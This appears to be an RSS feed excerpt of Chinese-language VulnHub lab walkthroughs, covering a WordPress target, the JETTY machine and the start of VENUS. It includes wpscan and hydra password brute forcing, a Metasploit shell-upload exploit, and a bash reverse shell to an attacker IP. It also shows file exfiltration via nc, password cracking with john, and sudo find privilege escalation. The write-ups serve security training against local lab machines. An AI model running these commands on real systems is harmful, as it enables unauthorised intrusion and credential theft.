&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-964.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;指定用户为 erdalkomurcu 进行密码爆破&lt;/p&gt;
&lt;p&gt;&lt;code&gt;wpscan --api-token eG5iT4ooiuP7eVJVedsHhlgx8xeZHmAJjBr13asnjEc --url http://192.168.31.29/lyricsblog/ -U erdalkomurcu -P /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-965.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;密码爆破了很长时间都没成功，可能是一个复杂密码&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-966.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;从工具出发没有找到，那么我们就从常规的目录扫描进行测试&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-967.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;一些常规的目录，没有什么特殊的，就是有一个 login 地址&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-968.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 既然工具和目录扫描都没有发现可疑的信息，可以尝试去检查一些源代码，看看靶机作者有没有遗留一些提示给我们&lt;/p&gt;
&lt;h3 id=&#34;智力游戏解谜2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#智力游戏解谜2&#34;&gt;#&lt;/a&gt; 智力游戏解谜 2&lt;/h3&gt;
&lt;p&gt;查看 wordpress 首页的源代码 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTkvbHlyaWNzYmxvZy8=&#34;&gt;http://192.168.31.19/lyricsblog/&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-969.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;访问这个网址，得到一个文件: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjkvbHlyaWNzYmxvZy95ZXNtYW4ucG5n&#34;&gt;http://192.168.31.29/lyricsblog/yesman.png&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-970.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;blockquote&gt;
&lt;p&gt;线索到这里就断了，这个图片并没有什么利用价值。但是我们可以肯定的是，线索一定是存在在 wordpres 这个站点上的。接下来我们就手动翻一翻网页，看面有没有什么线索。观察上边的图片，对比在站点上找到的页面，发现了一个巧合点，此图片顶头有个 YES,I ENJOY HAKAN TASIYAN, 网页上有一段标题为 Hakan Taşıyan – Doktor 可能突破点就在于这个点。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-971.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;进到这个页面之后，这里有三段文字&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-972.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;是不是有联系，将不带标题的段落文本复制到文本文件中并保存，计算并检查 MD5 消息摘要&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-973.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;在后台处尝试登陆，用户名为 wpscan 破解出来的，密码就用此 md5 数据&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-974.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;登陆失败，将 md5 数据由小写变为大写再次尝试&lt;/p&gt;
&lt;p&gt;&lt;code&gt;cat md5.txt | awk &#39;&amp;#123;print toupper($0)&amp;#125;&#39; &amp;gt;&amp;gt; MD5.txt&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-975.png&#34; width=&#34;450&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;再次登陆此网址 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTkvbHlyaWNzYmxvZy93cC1sb2dpbi5waHA=&#34;&gt;http://192.168.31.19/lyricsblog/wp-login.php&lt;/span&gt;&lt;br&gt;
 由密码 BC78C6AB38E114D6135409E44F7CDDA2 成功进入&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-976.png&#34; width=&#34;250&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;后台页面显示如下&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-977.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;msf攻击wordpress&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#msf攻击wordpress&#34;&gt;#&lt;/a&gt; msf 攻击 wordpress&lt;/h3&gt;
&lt;p&gt;可以搜索 wordpress 相关版本查看相关漏洞，查看版本之后用 msf 反弹 shell&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;use exploit/unix/webapp/wp_admin_shell_upload&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set password BC78C6AB38E114D6135409E44F7CDDA2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set rhosts 192.168.31.29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set username erdalkomurcu&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set targeturi /lyricsblog&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-978.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;options 检查如下参数&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-979.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;run 开始执行 wordpress 的攻击，成功拿到靶机的 webshell&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-980.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;meterpreter反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#meterpreter反弹shell&#34;&gt;#&lt;/a&gt; meterpreter 反弹 shell&lt;/h3&gt;
&lt;p&gt;将 msf 的 shell 反弹出来进行美化便于操作&lt;br&gt;
 &lt;code&gt;bash -c &#39;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.31.75/4445 0&amp;gt;&amp;amp;1&#39;&lt;/code&gt; &lt;br&gt;
 &lt;code&gt;nc -lvvp 4445&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-981.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;keepass-密码破解&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#keepass-密码破解&#34;&gt;#&lt;/a&gt; keepass 密码破解&lt;/h3&gt;
&lt;p&gt;翻阅服务器的相关文件，看到 config 配置文件，找到了数据库用户名和密码，并且 /etc/passwd 中是用 raphael 这个用户的  &lt;code&gt;su raphael:_double_trouble_&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-982.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;blockquote&gt;
&lt;p&gt;注意到此用户根目录下有一个隐藏文件.chadroot.kdbx,KeePass 是一款免费的开源密码管理器，可帮助您以安全的方式管理您的密码。您可以将所有密码存储在一个数据库中，该数据库由主密钥锁定。因此，您只需记住一个主密钥即可解锁整个数据库。数据库文件使用目前已知的最佳和最安全的加密算法（AES- 256 、ChaCha20 和 Twofish）进行加密。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Keepass 存在漏洞，把其传到 kali 机器上，有多种传输方式&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;scp  &lt;code&gt;scp -P22 parallels@192.168.31.73:/home/parallels/Desktop/tmp/.chadroot.kdbx .&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-983.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;ul&gt;
&lt;li&gt;nc  &lt;code&gt;nc 192.168.31.73 4446 &amp;lt; .chadroot.kdbx&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-984.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
&lt;ul&gt;
&lt;li&gt;wget  &lt;code&gt;python3 -m http.server 8000&lt;/code&gt;   &lt;code&gt;wget 192.168.31.29/.chadroot.kdbx -O 2.kdbx&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-985.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;用 keepass2john 将 kdbx 后缀的文件转化为 john 能破解的格式并破解&lt;/p&gt;
&lt;p&gt;&lt;code&gt;keepass2john .chadroot.kdbx &amp;gt; chadroot&lt;/code&gt; &lt;br&gt;
 &lt;code&gt;john --wordlist=/usr/share/wordlists/rockyou.txt chadroot&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-986.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 此处破解的密码应该是：chatter&lt;/p&gt;
&lt;p&gt;登陆网站 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9hcHAua2Vld2ViLmluZm8v&#34;&gt;https://app.keeweb.info/&lt;/span&gt; 输入 chatter 进入&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-987.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;得到如下界面，每一个页面里边都有一个 root 对应的密码，这四个密码分别是&lt;br&gt;
 &lt;code&gt;.:.yarak.:.&lt;/code&gt;   &lt;code&gt;sercertservice&lt;/code&gt;   &lt;code&gt;.:.subjective.:.&lt;/code&gt;   &lt;code&gt;rockyou.txt&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-988.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-989.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;在服务器里边分别尝试这四个 root 的密码是否正确&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-990.png&#34; width=&#34;370&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 输入密码.:.subjective.:. 时成功拿到 root 权限&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://n1h1l157.github.io/2021/11/01/VULNHUB/132%20JETTY/</guid>
            <title>VULNHUB 32 JETTY</title>
            <link>https://n1h1l157.github.io/2021/11/01/VULNHUB/132%20JETTY/</link>
            <category>VULNHUB 31-40</category>
            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;靶机下载地址:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvamV0dHktMSw2MjEv&#34;&gt;https://www.vulnhub.com/entry/jetty-1,621/&lt;/span&gt;&lt;br&gt;
 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTkyMjI3OC9hcnRpY2xlL2RldGFpbHMvMTEzNzA1Mjgx&#34;&gt;https://blog.csdn.net/weixin_45922278/article/details/113705281&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
 靶机 JETTY：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;p&gt;1 ）确定靶机 ip 地址&lt;br&gt;
 &lt;code&gt;sudo arp-scan -l&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-829.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机 ip：192.168.31.66&lt;/p&gt;
&lt;p&gt;2 ）确认靶机 ip 开放的端口信息&lt;br&gt;
 &lt;code&gt;sudo nmap -A -p- 192.168.31.66&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-830.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机开放端口 21,80&lt;/p&gt;
&lt;h3 id=&#34;ftp-弱口令及下载&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ftp-弱口令及下载&#34;&gt;#&lt;/a&gt; FTP 弱口令及下载&lt;/h3&gt;
&lt;p&gt;先从 ftp 进行下手&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-831.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;尝试弱口令登陆成功，看到 ftp 服务中存在两个文件，用 lcd 来在 ftp 服务中控制 kali 的目录，下载文件&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-832.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;查看下载下来的两个文件&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-833.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;其中 README.txt 中给了 Henry、Michael 的用户名，解压 sshpass.zip 的时候发现其是有密码认证的&lt;/p&gt;
&lt;h3 id=&#34;zip加密破解&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#zip加密破解&#34;&gt;#&lt;/a&gt; zip 加密破解&lt;/h3&gt;
&lt;p&gt;破解 zip  &lt;code&gt;fcrackzip -D -u -p /usr/share/wordlists/rockyou.txt sshpass.zip&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-834.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;也可以使用 zip2john 将加密的 zip 转化为可以用 john 破解的&lt;/p&gt;
&lt;p&gt;&lt;code&gt;zip2join sshpass.zip &amp;gt; ssh.txt&lt;/code&gt; &lt;br&gt;
 &lt;code&gt;john ssh.txt –wordlist=/usr/share/wordlists/rockyou.txt&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-835.png&#34; width=&#34;680&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;得到 zip 的密码为 seahorse！进行解压&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-836.png&#34; width=&#34;450&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 解压后即得到了 ssh 的密码&lt;/p&gt;
&lt;p&gt;到目前为止我们已经得到了 ssh 的一个疑似账户 Henry 和一个 ssh 密码&lt;br&gt;
但是我们扫描端口时并没有发现 ssh 协议是开启的，还需要其他的信息收集&lt;/p&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNjY=&#34;&gt;http://192.168.31.66&lt;/span&gt; 进行信息收集&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-837.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;识别目录，看能否找到更多的目录信息&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-838.png&#34; width=&#34;360&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;查看目录: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNjYvcm9ib3RzLnR4dA==&#34;&gt;http://192.168.31.66/robots.txt&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;发现了四个目录，依次访问之后没有发现&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-839.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;到此为止，我们的信息收集工作就做完了，但是仍然还有个问题，为什么没有开启 ssh 协议，是不是之前识别的结果有问题？还有就是 ssh 用户名只有这一个吗，还有没有其他的可能的用户名。带着问题去看 vulnhub 上给出的提示，发现了一个用户名 Squiddie。&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-840.png&#34; width=&#34;450&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;hydra-爆破-ssh&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#hydra-爆破-ssh&#34;&gt;#&lt;/a&gt; hydra 爆破 ssh&lt;/h3&gt;
&lt;p&gt;其次，用 nmap 再次更详细的扫描一下端口，看能否扫描到 ssh 协议&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-841.png&#34; width=&#34;570&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;经过这一次的扫描，扫描到了 65507 端口开放的是 ssh 协议可能因为这个端口在比较靠后的位置，并且不是常用的端口，所以第一次扫描的时候并没有扫到&lt;/p&gt;
&lt;p&gt;003 hydra 指定端口爆破，find 提权&lt;/p&gt;
&lt;p&gt;现在我门就通过 hydra 爆破 65507 端口处的 ssh 协议，并且指定用户名为 Henry、Michael、Squiddie 以及这三个及首字母变为小写的三个，密码为爆破 zip 之后解压出来的密码&lt;br&gt;
 &lt;code&gt;hydra -L user.txt -P sshpass.txt ssh://192.168.31.66 -f -t 4 -I -s 65507 -vV -o hydra.ssh&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;得到密码并连接&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-843.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;ssh &lt;span class=&#34;exturl&#34; data-url=&#34;bWFpbHRvOnNxdWlkZGllQDE5Mi4xNjguMzEuNjY=&#34;&gt;squiddie@192.168.31.66&lt;/span&gt; -p 65507&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-844.png&#34; width=&#34;630&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 连接成功&lt;/p&gt;
&lt;h3 id=&#34;sudofind-提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sudofind-提权&#34;&gt;#&lt;/a&gt; sudo (find) 提权&lt;/h3&gt;
&lt;p&gt;靶机里边装了一个 python2 的命令，输入 python2 打开其命令行&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;import pty&lt;br&gt;
pty.spawn(&amp;quot;/bin/bash&amp;quot;)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-846.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;得到一个标准的 shell&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;sudo -l 时发现了可以无密码调用 root 的 find 命令，利用 find 提权&lt;br&gt;
 sudo find. -exec /bin/sh ; -quit&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-847.png&#34; width=&#34;450&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 成功拿到了 root 权限&lt;/p&gt;
&lt;h3 id=&#34;架构不支持处理&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#架构不支持处理&#34;&gt;#&lt;/a&gt; 架构不支持处理&lt;/h3&gt;
&lt;p&gt;此靶机的目标是找到犯罪证据，还需进一步的深入测试，查看定时任务  &lt;code&gt;crontab -l&lt;/code&gt;  发现有一个备份文件一直在执行，此命令就是做一个备份，跟踪找到这个.docs 的文件夹查看内容&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-848.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
&lt;blockquote&gt;
&lt;p&gt;这里有几个 xlsx 的文件以及一个文件夹，也许这几个文件就是犯罪证据，我们将这些文件都发送到 kali 机器上，用 scp/ftp/python 等方式进行传输&lt;br&gt;
 scp -r * &lt;span class=&#34;exturl&#34; data-url=&#34;bWFpbHRvOnBhcmFsbGVsc0AxOTIuMTY4LjMxLjY1&#34;&gt;parallels@192.168.31.65&lt;/span&gt;:~/Desktop/tool/jetty/doc/&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-849.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;Kali 机器接受到文件之后，直接双击打开这些 xlsx 的文件&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-850.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;错误内容显示架构不支持，因为此 kali 机器是在 mac M1 上虚拟出来的虚拟机，是 arm 架构的 kali，所以有些东西是没有兼容的&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-851.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;并且 Password_kepper 文件夹中有一个 exe 的 windows 上才能执行的可执行文件，是需要发到 windows 机器上才能运行的&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-852.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;这个地方我再次通过 scp 将这些文件都传输到了一般用的 amd 的 windows 机器&lt;br&gt;
 &lt;code&gt;ping 192.168.31.91&lt;/code&gt; &lt;br&gt;
 &lt;code&gt;scp -r * administrator@192.168.31.91:/E:/Desktop/doc/&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-853.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;传输成功，结果如下图&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-854.png&#34; width=&#34;630&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;xlsx 文件需要密码才能解开&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-855.png&#34; width=&#34;430&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;运行 exe 文件，发现有个选项可以查看密码&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-856.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;大致浏览了一下所有的信息之后，发现这个 exe 文件是用 pyinstaller 编译出来的，既然如此，接下来我们的目标就是去反编译这个 exe 文件&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-857.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;uncompyle6-反编译-pyc&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#uncompyle6-反编译-pyc&#34;&gt;#&lt;/a&gt; uncompyle6 反编译 pyc&lt;/h3&gt;
&lt;p&gt;下载在 github 上用于反编译 pyinstaller 生成的文件的工具 pyinstxtractor&lt;br&gt;
 &lt;code&gt;wget https://github.com/extremecoders-re/pyinstxtractor.git&lt;/code&gt; &lt;br&gt;
 &lt;code&gt;Python2 pyinstxtractor.py password_keeper.exe&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-858.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;查看执行效果&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-859.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;执行之后会在 pyinstxtractor.py 同目录下生成一个文件夹，产生一个 password_keeper.exe_extracted 目录，在目录下找到关键 pyc 文件也就是 password_keeper.pyc，再将这个文件反编译。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;使用 uncompyle6 反编译 pyc 文件&lt;br&gt;
安装 uncompyle  &lt;code&gt;pip install uncompyle&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-860.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;反编译 pyc 文件  &lt;code&gt;uncompyle6 .\password_keeper.pyc &amp;gt; password_keeper.py&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-861.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;调查取证&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#调查取证&#34;&gt;#&lt;/a&gt; 调查取证&lt;/h3&gt;
&lt;p&gt;对得到的代码进行代码审计&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-862.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;总结功能大概如下，我们输入选项之后，需要我们输入一个密钥，将此密钥进行 base64 加密后与代码中的 key 进行比对，如果是相同的就会输出密码&lt;/p&gt;
&lt;p&gt;先进行 base64 解密 &lt;code&gt;echo “N2FlMjE4ZmYyOTI4ZjZiMg==” ｜ base64 -d&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-863.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;运行 exe 文件，输入 1，然后输入解密后的密钥 7ae218ff2928f6b2&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-864.png&#34; width=&#34;400&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;得到了五个密码，分别是这五个 xlsx 的密码&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-865.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;&lt;/p&gt;
&lt;p&gt;-&amp;gt; 成功拿到犯罪证据&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://n1h1l157.github.io/2021/11/01/VULNHUB/137%20VENUS/</guid>
            <title>VULNHUB 37 VENUS</title>
            <link>https://n1h1l157.github.io/2021/11/01/VULNHUB/137%20VENUS/</link>
            <category>VULNHUB 31-40</category>
            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvdGhlLXBsYW5ldHMtdmVudXMsNzA1Lw==&#34;&gt;https://www.vulnhub.com/entry/the-planets-venus,705/&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
 靶机 VENUS：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;p&gt;1 ）确定靶机 ip 地址和开放的端口&lt;br&gt;
 &lt;code&gt;sudo arp-scan -l &amp;gt; 1.txt ; cat 1.txt | grep &#39;a0&#39; &amp;gt; 2.txt ; rm -f 1.txt ; cat 2.txt | awk &#39;&amp;#123;print$1&amp;#125;&#39; &amp;gt; ip.txt; rm -f 2.txt; sudo nmap -PA -iL ip.txt;rm -f ip.txt&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-991.png&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机 ip：192.168.31.12 靶机开放端口 22,8080&lt;/p&gt;
&lt;h3 id=&#34;网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网站信息收集&#34;&gt;#&lt;/a&gt; 网站信息收集&lt;/h3&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTI6ODA4MC8=&#34;&gt;http://192.168.31.12:8080/&lt;/span&gt; 进行信息收集&lt;/p&gt;
